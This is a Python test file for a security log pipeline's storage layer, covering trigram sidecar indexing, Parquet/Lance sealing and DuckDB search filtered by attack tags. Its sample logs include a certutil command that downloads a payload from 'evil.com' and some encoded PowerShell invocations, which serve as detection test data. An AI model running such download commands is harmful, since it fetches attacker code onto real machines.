"""Subsystem 9: Storage, Parquet Sealing, DuckDB Bitwise Filtering & LogLite-Q Sidecar."""

import json
import importlib

import pytest

from snort.ingest.events import (
    FLUX_TAG_ATTACK,
    canonical_bytes,
    event_hash,
    normalize_event,
)
from snort.ingest.wal import WalWriter
from snort.store.index import build_index
from snort.store.qidx import TrigramSidecar
from snort.store.seal import seal_segments
from snort.store.search import search


def test_store_subsystem_seal_qidx_and_search(tmp_path):
    """Verify LogLite-Q trigram index, WAL sealing to Lance, and DuckDB flux_filter bitmask search."""
    # 1. LogLite-Q Trigram Sidecar Index
    sidecar = TrigramSidecar()
    raw_logs = [
        "2026-10-01 GET /healthz 200 OK host=web01",
        "2026-10-01 POST /api/v1/auth 401 Unauthorized user=admin",
        "2026-10-01 powershell.exe -enc SQBFAFgA attacker=192.168.1.55",
        "2026-10-01 certutil.exe -urlcache -split -f http://evil.com/payload.exe",
    ]
    sidecar.build_from_records(raw_logs)

    # Fast trigram candidate filtering + verification
    res_ps = sidecar.query("powershell", raw_logs)
    assert res_ps == [2]
    res_cert = sidecar.query("certutil", raw_logs)
    assert res_cert == [3]
    res_health = sidecar.query("healthz", raw_logs)
    assert res_health == [0]
    res_none = sidecar.query("nonexistent_subpattern", raw_logs)
    assert res_none == []

    # 2. Write events to WAL with FluxSieve bitmasks
    wal_dir = tmp_path / "wal"
    sealed_dir = tmp_path / "sealed"
    wal_dir.mkdir(parents=True, exist_ok=True)
    sealed_dir.mkdir(parents=True, exist_ok=True)

    writer = WalWriter(wal_dir)
    ev1 = normalize_event(
        {
            "ts": "2026-10-01T12:00:00Z",
            "host": "srv-1",
            "action": "exec",
            "raw": "host=srv-1 powershell.exe -enc KAAgACgAIwA=",
            "source_seq": 0,
        },
        source_id="sysmon",
    )
    ev2 = normalize_event(
        {
            "ts": "2026-10-01T12:01:00Z",
            "host": "srv-1",
            "action": "exec",
            "raw": "host=srv-1 systemd-resolved query google.com",
            "source_seq": 1,
        },
        source_id="auditd",
    )
    writer.append(ev1)
    writer.append(ev2)
    writer.roll()

    # 3. Seal WAL segments to Lance/Parquet datasets
    manifests = seal_segments(wal_dir, sealed_dir)
    assert len(manifests) >= 1
    assert (sealed_dir / "sealed-manifest.json").exists()

    # 4. DuckDB Unified Query with Bitwise Pushdown (flux_filter)
    # Search all sealed records
    all_hits = search("srv-1", sealed_dir=sealed_dir, wal_dir=wal_dir)
    assert len(all_hits) == 2

    # Query with bitwise flux_filter pushing ((flux_tags & FLUX_TAG_ATTACK) != 0) into DuckDB
    attack_hits = search(
        "srv-1",
        sealed_dir=sealed_dir,
        wal_dir=wal_dir,
        flux_filter=FLUX_TAG_ATTACK,
    )
    assert len(attack_hits) == 1
    assert "powershell" in attack_hits[0]["raw"]
    assert (attack_hits[0]["flux_tags"] & FLUX_TAG_ATTACK) != 0

    # Query matching benign event specifically
    resolved_hits = search(
        "systemd-resolved",
        sealed_dir=sealed_dir,
        wal_dir=wal_dir,
    )
    assert len(resolved_hits) == 1
    assert "systemd-resolved" in resolved_hits[0]["raw"]


@pytest.mark.parametrize(
    "bm25,fallback", [(False, False), (False, True), (True, False)]
)
def test_legacy_sealed_search_projects_zero_tags_without_rewriting(
    tmp_path, monkeypatch, bm25, fallback
):
    seal_module = importlib.import_module("snort.store.seal")
    search_module = importlib.import_module("snort.store.search")
    wal, sealed, index = (tmp_path / name for name in ("wal", "sealed", "index"))
    old = normalize_event(
        {
            "ts": "2024-01-01T00:00:01Z",
            "host": "h",
            "action": "exec",
            "raw": "powershell old",
        }
    )
    old.pop("flux_tags")
    attrs = json.loads(old["attributes"])
    attrs.pop("flux_tags")
    old["attributes"] = canonical_bytes(attrs).decode()
    old["event_hash"] = event_hash(old)
    with WalWriter(wal) as writer:
        writer.append(old)
    # Build the same valid sealed schema/manifest written before tagging existed.
    with monkeypatch.context() as legacy:
        legacy.setattr(
            seal_module,
            "EVENT_COLUMNS",
            [c for c in seal_module.EVENT_COLUMNS if c != "flux_tags"],
        )
        seal_segments(wal, sealed)
    build_index(sealed, index)
    before = {
        p.relative_to(sealed): p.read_bytes() for p in sealed.rglob("*") if p.is_file()
    }
    if fallback:

        def no_duckdb_lance():
            raise search_module.duckdb.Error("Lance extension unavailable")

        monkeypatch.setattr(search_module, "_duckdb_con", no_duckdb_lance)
    hits = search("powershell", sealed, index, wal, bm25=bm25)
    assert len(hits) == 1
    assert hits[0]["event_hash"] == old["event_hash"]
    assert hits[0]["flux_tags"] == 0
    assert (
        search("powershell", sealed, index, wal, bm25=bm25, flux_filter=FLUX_TAG_ATTACK)
        == []
    )
    assert before == {
        p.relative_to(sealed): p.read_bytes() for p in sealed.rglob("*") if p.is_file()
    }
